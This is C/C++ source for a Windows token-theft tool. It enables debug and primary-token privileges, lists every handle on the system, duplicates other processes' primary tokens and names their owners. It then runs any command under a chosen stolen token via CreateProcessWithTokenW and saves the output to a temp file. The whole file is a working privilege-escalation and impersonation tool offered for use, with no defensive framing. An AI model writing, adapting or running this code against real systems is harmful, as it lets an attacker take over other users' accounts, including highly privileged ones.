#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll")

#define COMMAND_LENGTH 1000
#define TOKEN_TYPE_LENGTH 30
#define FULL_NAME_LENGTH 271
#define OB_TYPE_INDEX_TOKEN 4
#define MAX_USERNAME_LENGTH 256
#define MAX_DOMAINNAME_LENGTH 15
#define SystemHandleInformation 16
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define SystemHandleInformationSize 1024 * 1024 * 10
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW ((NTSTATUS)0x80000005L)

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT ProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
}  SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS(WINAPI* NTQUERYSYSTEMINFORMATION)(
    DWORD SystemInformationClass,
    PVOID SystemInformation,
    DWORD SystemInformationLength,
    PDWORD ReturnLength
);

typedef enum _POOL_TYPE{
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef NTSTATUS(WINAPI* NTQUERYOBJECT)(
    HANDLE ObjectHandle,
    OBJECT_INFORMATION_CLASS ObjectInformationClass,
    PVOID ObjectInformation,
    DWORD Length,
    PDWORD ResultLength
);

typedef UNICODE_STRING OBJECT_NAME_INFORMATION;
typedef UNICODE_STRING* POBJECT_NAME_INFORMATION;

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct {
    BOOL valid;
    int token_id;
    HANDLE token_handle;
    wchar_t user_name[FULL_NAME_LENGTH];
} TOKEN;

void duplicate_and_launch(HANDLE token, wchar_t* command) {
    HANDLE duplicated_token;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    
    wchar_t file_output[] = L"C:\\Windows\\Temp\\output.txt";
    HANDLE fileHandle = CreateFileW(file_output, FILE_APPEND_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdInput = NULL;
    si.hStdError = si.hStdOutput = fileHandle;

    if (DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicated_token) != 0){
        CreateProcessWithTokenW(duplicated_token, NULL, NULL, command, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(duplicated_token);
    }
    CloseHandle(fileHandle);
    return;
}

TOKEN* is_primary_token(TOKEN* TOKEN_INFO) {
    DWORD returned_tokinfo_length;
    if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
            if (TokenStatisticsInformation->TokenType == TokenPrimary) {
                wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH];
                DWORD user_length = sizeof(username), domain_length = sizeof(domain), token_info;
                SID_NAME_USE sid;
                if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenUser, NULL, 0, &token_info)) {
                    PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
                    if (GetTokenInformation(TOKEN_INFO->token_handle, TokenUser, TokenStatisticsInformation, token_info, &token_info)) {
                        LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
                        _snwprintf_s(TOKEN_INFO->user_name, FULL_NAME_LENGTH, L"%ws/%ws", domain, username);;
                        TOKEN_INFO->valid = 0;
                    }
                }
            }
        }
    }
    return TOKEN_INFO;
}

LPWSTR GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass){
    LPWSTR data = NULL;
    DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)malloc(dwSize);

    NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    if ((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)) {
        pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
        ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    }
    if ((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL)) {
        data = (LPWSTR)calloc(pObjectInfo->Length, sizeof(WCHAR));
        CopyMemory(data, pObjectInfo->Buffer, pObjectInfo->Length);
    }
    free(pObjectInfo);
    return data;
}

int wmain(int argc, wchar_t* argv[]) {
    HANDLE hProcess, hToken;
    LUID luidSeDebugPrivivilege, luidSeAssignPrimaryTokenPrivilege, luidSeIncreaseQuotaPrivilege;
    TOKEN_PRIVILEGES tp;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luidSeAssignPrimaryTokenPrivilege);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luidSeAssignPrimaryTokenPrivilege;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivivilege);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luidSeDebugPrivivilege;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

    LookupPrivilegeValue(NULL, SE_INCREASE_QUOTA_NAME, &luidSeIncreaseQuotaPrivilege);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luidSeIncreaseQuotaPrivilege;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    
    CloseHandle(hProcess);
    CloseHandle(hToken);

    ULONG returnLenght = 0;
    TOKEN found_tokens[50];
    int nbrsfoundtokens = 0;
    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
    
    for (DWORD i = 0; i < handleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];
        HANDLE dupHandle;
        
        HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
        if (process == INVALID_HANDLE_VALUE) {
            CloseHandle(process);
            continue;
        }

        if (DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0) {
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        POBJECT_TYPE_INFORMATION objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(8192);
        LPWSTR lpwsType = GetObjectInfo(dupHandle, ObjectTypeInformation);

        if (wcscmp(lpwsType, L"Token")){
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        TOKEN TOKEN_INFO;
        TOKEN_INFO.valid = 1;
        TOKEN_INFO.token_handle = dupHandle;
        is_primary_token(&TOKEN_INFO);
        
        if (TOKEN_INFO.valid == 0) {
            int is_new_token = 0;
            for (int j = 0; j <= nbrsfoundtokens; j++) {
                if (wcscmp(found_tokens[j].user_name, TOKEN_INFO.user_name) == 0) {
                    is_new_token = 1;
                }
            }

            if (is_new_token == 0) {
                TOKEN_INFO.token_id = nbrsfoundtokens;
                found_tokens[nbrsfoundtokens] = TOKEN_INFO;
                nbrsfoundtokens += 1;
            }
        }
        CloseHandle(process);
    }

    if (argc != 3) {
        for (int k = 0; k < nbrsfoundtokens; k++) {
            printf("%d %ws\n", found_tokens[k].token_id, found_tokens[k].user_name);
        }
    }

    if (argc == 3) {
        int selected_token = _wtoi(argv[1]);
        for (int k = 0; k < nbrsfoundtokens; k++) {
            if (found_tokens[k].token_id == selected_token) {
                duplicate_and_launch(found_tokens[k].token_handle, argv[2]);
            }
        }
    }
    return 0;
}
